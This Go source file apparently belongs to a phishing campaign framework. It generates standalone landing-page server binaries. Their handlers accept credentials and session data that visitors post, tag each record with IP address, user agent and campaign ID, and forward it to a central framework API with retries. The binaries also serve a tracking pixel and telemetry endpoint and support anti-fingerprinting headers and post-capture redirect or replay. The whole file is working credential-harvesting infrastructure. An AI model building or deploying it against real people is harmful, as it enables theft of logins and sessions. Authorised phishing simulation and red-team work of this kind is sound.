// Package gogen generates Go source code for standalone landing page binaries.
package gogen

import (
	"fmt"
	"strings"

	"tackle/internal/compiler/htmlgen"
)

// GoSourceConfig holds configuration for Go source generation.
type GoSourceConfig struct {
	// ModuleName for the generated go.mod (e.g., "landingpage").
	ModuleName string
	// BuildToken is the unique build token baked into the binary.
	BuildToken string
	// CampaignID is the campaign this build belongs to.
	CampaignID string
	// FrameworkBaseURL is the framework's internal API URL.
	FrameworkBaseURL string
	// PostCaptureAction determines behavior after credential capture.
	PostCaptureAction string
	// PostCaptureRedirectURL for redirect actions.
	PostCaptureRedirectURL string
	// PostCaptureDelayMs for delay_redirect.
	PostCaptureDelayMs int
	// PostCapturePageRoute for display_page action.
	PostCapturePageRoute string
	// PostCaptureReplayURL for replay action.
	PostCaptureReplayURL string
	// HeaderMiddlewareSrc is generated Go source for HTTP header middleware (from anti-fingerprinting).
	HeaderMiddlewareSrc string
	// Pages is the list of generated page outputs for route registration.
	Pages []htmlgen.PageOutput
}

// GeneratedSource holds all generated Go source files.
type GeneratedSource struct {
	// Files maps filename to content.
	Files map[string]string
}

// GenerateGoSource generates all Go source files for the landing page binary.
func GenerateGoSource(config GoSourceConfig) (*GeneratedSource, error) {
	if config.ModuleName == "" {
		config.ModuleName = "landingpage"
	}
	if config.BuildToken == "" {
		return nil, fmt.Errorf("gogen: build token is required")
	}
	if config.FrameworkBaseURL == "" {
		return nil, fmt.Errorf("gogen: framework base URL is required")
	}

	files := make(map[string]string)

	files["go.mod"] = generateGoMod(config.ModuleName)
	files["main.go"] = generateMain(config)
	files["handlers.go"] = generateHandlers(config)

	return &GeneratedSource{Files: files}, nil
}

func generateGoMod(moduleName string) string {
	return fmt.Sprintf("module %s\n\ngo 1.22\n", moduleName)
}

func generateMain(config GoSourceConfig) string {
	var routeRegistrations strings.Builder
	for _, page := range config.Pages {
		route := page.Route
		if route == "" {
			route = "/"
		}
		routeRegistrations.WriteString(fmt.Sprintf("\tmux.HandleFunc(\"%s\", serveStaticPage(\"%s\"))\n",
			route, page.Filename))
	}

	return fmt.Sprintf(`package main

import (
	"context"
	"embed"
	"flag"
	"log"
	"net/http"
)

//go:embed static/*
var staticFS embed.FS

const (
	buildToken   = %q
	campaignID   = %q
	frameworkURL = %q
)

// queue is the retry queue for failed forwarding requests.
var queue = newRetryQueue(1000)

func main() {
	port := flag.Int("port", 8080, "port to listen on")
	flag.Parse()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start the retry queue processor
	go queue.processLoop(ctx)

	mux := http.NewServeMux()

	// Page routes
%s
	// API routes
	mux.HandleFunc("/capture", handleCapture)
	mux.HandleFunc("/track", handleTracking)
	mux.HandleFunc("/telemetry", handleTelemetry)
	mux.HandleFunc("/session-capture", handleSessionCapture)
	mux.HandleFunc("/health", handleHealth)

	// Static assets
	mux.Handle("/static/", http.FileServer(http.FS(staticFS)))

	handler := headerMiddleware(mux)

	addr := ":" + itoa(*port)
	log.Printf("Landing page server starting on %%s", addr)
	if err := http.ListenAndServe(addr, handler); err != nil {
		log.Fatalf("Server failed: %%v", err)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b) - 1
	for n > 0 {
		b[i] = byte('0' + n%%10)
		n /= 10
		i--
	}
	return string(b[i+1:])
}
`, config.BuildToken, config.CampaignID, config.FrameworkBaseURL, routeRegistrations.String())
}

func generateHandlers(config GoSourceConfig) string {
	headerMiddleware := config.HeaderMiddlewareSrc
	if headerMiddleware == "" {
		headerMiddleware = `func headerMiddleware(next http.Handler) http.Handler {
	return next
}`
	}

	return fmt.Sprintf(`package main

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

func serveStaticPage(filename string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		data, err := staticFS.ReadFile("static/" + filename)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(data)
	}
}

func handleCapture(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var payload map[string]any
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Add build metadata
	payload["campaign_id"] = campaignID
	payload["build_token"] = buildToken
	payload["metadata"] = map[string]any{
		"ip":         r.RemoteAddr,
		"user_agent": r.UserAgent(),
		"timestamp":  time.Now().UTC().Format(time.RFC3339),
	}

	forwardJSON(frameworkURL+"/api/v1/internal/captures", payload)

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("{\"status\":\"ok\"}"))
}

// trackPixelGIF is a 1x1 transparent GIF.
var trackPixelGIF = []byte{
	0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
	0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21,
	0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
	0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44,
	0x01, 0x00, 0x3b,
}

func handleTracking(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	trackingToken := q.Get("t")
	eventType := q.Get("e")
	pageRoute := q.Get("r")

	if eventType == "" {
		eventType = "page_view"
	}

	meta := map[string]any{
		"ip":         r.RemoteAddr,
		"user_agent": r.UserAgent(),
		"page_route": pageRoute,
		"timestamp":  time.Now().UTC().Format(time.RFC3339),
	}

	// Forward additional tracking params as metadata.
	if d := q.Get("d"); d != "" {
		meta["duration"] = d
	}
	if f := q.Get("f"); f != "" {
		meta["form_name"] = f
	}
	if c := q.Get("c"); c != "" {
		meta["component_id"] = c
	}
	if h := q.Get("h"); h != "" {
		meta["target_href"] = h
	}

	payload := map[string]any{
		"campaign_id":    campaignID,
		"build_token":    buildToken,
		"tracking_token": trackingToken,
		"event_type":     eventType,
		"metadata":       meta,
	}

	forwardJSON(frameworkURL+"/api/v1/internal/tracking", payload)

	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
	w.Write(trackPixelGIF)
}

func handleTelemetry(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var payload map[string]any
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	payload["campaign_id"] = campaignID
	payload["build_token"] = buildToken

	forwardJSON(frameworkURL+"/api/v1/internal/telemetry", payload)

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("{\"status\":\"ok\"}"))
}

func handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("{\"status\":\"healthy\"}"))
}

func handleSessionCapture(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var payload map[string]any
	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Add build metadata
	payload["campaign_id"] = campaignID
	payload["build_token"] = buildToken

	// Forward to framework's internal API for session capture processing
	forwardJSON(frameworkURL+"/api/v1/internal/session-captures", payload)

	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte("{\"status\":\"ok\"}"))
}

func forwardJSON(url string, payload map[string]any) {
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("Failed to marshal payload for %%s: %%v", url, err)
		return
	}

	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(data))
	if err != nil {
		log.Printf("Failed to create request for %%s: %%v", url, err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Build-Token", buildToken)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode >= 500 {
		// Enqueue for retry; payload is NOT logged to avoid exposing credentials
		queue.enqueue(url, data)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

// --- Retry Queue ---

var retryBackoffSlots = []time.Duration{
	5 * time.Second, 10 * time.Second, 20 * time.Second, 40 * time.Second, 80 * time.Second,
}

type retryEntry struct {
	url       string
	payload   []byte
	attempts  int
	nextRetry time.Time
}

type retryQueue struct {
	mu      sync.Mutex
	entries []retryEntry
	maxSize int
}

func newRetryQueue(maxSize int) *retryQueue {
	return &retryQueue{entries: make([]retryEntry, 0, maxSize), maxSize: maxSize}
}

func (q *retryQueue) enqueue(url string, payload []byte) {
	q.mu.Lock()
	defer q.mu.Unlock()
	entry := retryEntry{url: url, payload: payload, attempts: 1, nextRetry: time.Now().Add(retryBackoff(0))}
	if len(q.entries) >= q.maxSize {
		q.entries = q.entries[1:]
	}
	q.entries = append(q.entries, entry)
}

func retryBackoff(attempt int) time.Duration {
	if attempt >= len(retryBackoffSlots) {
		return retryBackoffSlots[len(retryBackoffSlots)-1]
	}
	return retryBackoffSlots[attempt]
}

func (q *retryQueue) processLoop(ctx context.Context) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			q.processOnce()
		}
	}
}

func (q *retryQueue) processOnce() {
	q.mu.Lock()
	// Snapshot entries due for retry and release the lock before making HTTP calls.
	now := time.Now()
	var due []int
	for i, e := range q.entries {
		if now.After(e.nextRetry) {
			due = append(due, i)
		}
	}
	q.mu.Unlock()

	if len(due) == 0 {
		return
	}

	// Process entries without holding the lock.
	var succeeded []int
	var evicted []int
	type failUpdate struct {
		idx   int
		entry retryEntry
	}
	var failed []failUpdate

	q.mu.Lock()
	snapshot := make([]retryEntry, len(q.entries))
	copy(snapshot, q.entries)
	q.mu.Unlock()

	for _, idx := range due {
		if idx >= len(snapshot) {
			continue
		}
		entry := snapshot[idx]
		req, err := http.NewRequest(http.MethodPost, entry.url, bytes.NewReader(entry.payload))
		if err != nil {
			evicted = append(evicted, idx)
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Build-Token", buildToken)
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil || resp.StatusCode >= 500 {
			entry.attempts++
			if entry.attempts > 5 {
				log.Printf("Evicting retry entry for %%s after %%d attempts", entry.url, entry.attempts)
				evicted = append(evicted, idx)
			} else {
				entry.nextRetry = time.Now().Add(retryBackoff(entry.attempts - 1))
				failed = append(failed, failUpdate{idx: idx, entry: entry})
			}
			if resp != nil {
				resp.Body.Close()
			}
			continue
		}
		resp.Body.Close()
		succeeded = append(succeeded, idx)
	}

	// Apply updates under lock.
	q.mu.Lock()
	defer q.mu.Unlock()
	// Update failed entries in-place.
	for _, f := range failed {
		if f.idx < len(q.entries) {
			q.entries[f.idx] = f.entry
		}
	}
	// Remove succeeded and evicted entries (in reverse order to preserve indices).
	remove := make(map[int]bool, len(succeeded)+len(evicted))
	for _, i := range succeeded {
		remove[i] = true
	}
	for _, i := range evicted {
		remove[i] = true
	}
	if len(remove) > 0 {
		kept := q.entries[:0]
		for i, e := range q.entries {
			if !remove[i] {
				kept = append(kept, e)
			}
		}
		q.entries = kept
	}
}

func (q *retryQueue) drain() {
	q.mu.Lock()
	entries := make([]retryEntry, len(q.entries))
	copy(entries, q.entries)
	q.mu.Unlock()

	for _, entry := range entries {
		req, err := http.NewRequest(http.MethodPost, entry.url, bytes.NewReader(entry.payload))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Build-Token", buildToken)
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			log.Printf("Drain failed for %%s (attempt %%d): %%v", entry.url, entry.attempts, err)
			continue
		}
		resp.Body.Close()
	}
}

%s
`, headerMiddleware)
}
